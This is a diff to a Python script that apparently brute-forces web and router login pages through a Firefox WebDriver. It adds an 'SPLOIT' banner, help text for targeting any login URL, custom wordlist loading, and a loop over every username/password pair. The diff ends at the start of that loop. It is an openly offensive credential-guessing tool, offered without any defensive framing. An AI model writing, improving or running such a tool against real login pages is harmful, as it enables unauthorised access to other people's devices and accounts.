@@ -14,6 +14,18 @@ BLUE = "\033[94m"
 GREEN = "\033[92m"
 RESET = "\033[0m"
 
+line1 = "__        _______ ____"
+line2 = "\ \      / /  ___/ ___| YOUR"
+line3 = " \ \ /\ / /| |_  \___ \ LOGIN"
+line4 = "  \ V  V / |  _|  ___) |PAGE"
+line5 = "   \_/\_/  |_|   |____/ SPLOIT"
+
+print(line1)
+print(line2)
+print(line3)
+print(line4)
+print(line5)
+
 def colored_print(text, color):
     return f"{color}{text}{RESET}"
 
@@ -24,10 +36,18 @@ def get_user_input(default, prompt, color):
     return user_input
 
 def main():
-    url = get_user_input('http://192.168.1.1', "Router's ip (default: 192.168.1.1): ", RESET)
+    usage = input("Show URL usage? y/n: ")
+    if usage.lower() == "y":
+        print("Enter the login page URL, for example: https://site.com:1234/login-page/login.html ")
+        print("- The file depends on how the login page was created, simply look at the login page URL and see if it has a file name. If not, just don't put anything after the URL.")
+        print("- The port depends on whether the site supports HTTP or HTTPS. If it's on port 443, use HTTPS in the URL. If the site uses port 80, use HTTP in the URL. Or if the site has another service port, simply specify it in the URL.")
+        print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
+    else:
+        pass
+    url = get_user_input('http://192.168.1.1', "Router's ip (default: http://192.168.1.1) : ", RESET)
     print("\r")
 
-    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}
+    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}  #you can add your own login page errors messages here
 
     u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
     username_element_type = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)
@@ -59,10 +79,30 @@ def main():
     print(colored_print("\rFirefox WebDriver started successfully", YELLOW))
 
     combinations_tested = 0
-    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
-    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
+
+    while True:
+        usernames_file = input("Usernames file location (default: username.txt): ")
+        if not usernames_file:
+            usernames_file = "username.txt"
+        passwords_file = input("Passwords file location (default: password.txt): ")
+        if not passwords_file:
+            passwords_file = "password.txt"
+
+        try:
+            with open(usernames_file, "r") as user_file:
+                usernames = [u.strip() for u in user_file.readlines()]
+            with open(passwords_file, "r") as pass_file:
+                passwords = [p.strip() for p in pass_file.readlines()]
+            break
+        except FileNotFoundError:
+            print("One or both files not found. Please provide valid file locations.")
+        except PermissionError:
+            print("Permission denied. Please check file permissions and try again.")
+        except Exception as e:
+            print(f"An error occurred while loading files: {e}")
+
     total_combinations = len(usernames) * len(passwords)
-    
+
     try:
         for username in usernames:
             for password in passwords:
